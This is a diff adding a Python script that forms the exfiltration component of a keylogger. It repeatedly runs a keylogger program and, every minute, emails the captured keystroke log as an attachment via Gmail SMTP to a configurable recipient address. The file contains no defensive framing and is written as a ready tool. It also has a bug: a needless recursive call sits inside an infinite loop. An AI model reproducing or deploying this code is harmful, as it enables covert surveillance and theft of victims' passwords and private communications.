@@ -1,0 +1,83 @@
+import sys
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os.path
+import subprocess
+import threading
+import time
+
+email = 'insert_sender_email_here'
+password = 'insert_sender_app_password_here'
+send_to_email = 'insert_reciever_email_address_here'
+subject = 'Read your logger file!'
+message = 'Good job, you did it!'
+file_location = 'insert_path_to_file_created_by_keylogger_here'
+python_executable = sys.executable
+
+# Function to run a subprocess to edit the attachment
+def edit_attachment(file_location):
+    print("Edit attachment function started...")
+    while True:  # Change to an infinite loop
+        try:
+            subprocess.run([python_executable, "insert_path_to_keylogger_here", file_location])
+            print("Subprocess Completed Successfully")
+            time.sleep(60)  # wait for one minute before sending next update
+        except subprocess.CalledProcessError as e:
+            print("Subprocess Error:", str(e))
+        except Exception as e:
+            print("An error occurred during subprocess:", str(e))
+
+        # Edit the attachment before sending
+        print("Editing attachment......")
+        edit_attachment(file_location)
+
+def send_minute_updates():
+    print("Send_minute_updates function started....")
+    while True:  # Change to an infinite loop
+        print("Sending minute update.....")
+        msg = MIMEMultipart()
+        msg['From'] = email
+        msg['To'] = send_to_email
+        msg['Subject'] = subject
+        msg.attach(MIMEText(message, 'plain'))
+
+        # Setup the attachment
+        filename = os.path.basename(file_location)
+        
+        with open(file_location, "r") as attachment_file:
+            attachment_content = attachment_file.read()
+        
+        part = MIMEText(attachment_content)
+        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+        # Attach the attachment to the MIMEMultipart object
+        msg.attach(part)
+        
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(email, password)
+            text = msg.as_string()
+            server.sendmail(email, send_to_email, text)
+            server.quit()
+            print("Email sent successfully")
+        except Exception as e:
+            print("An error occurred while sending the email", str(e))
+        
+        time.sleep(60)  # send an email every one minute
+
+# Create and start threads for subprocess and email sending
+subprocess_thread = threading.Thread(target=edit_attachment, args=(file_location,))
+email_thread = threading.Thread(target=send_minute_updates)
+
+print("Starting subprocess_thread......")
+subprocess_thread.start()
+print("Starting email_thread.....")
+email_thread.start()
+
+# Allow the threads to run indefinitely
+subprocess_thread.join()
+email_thread.join()
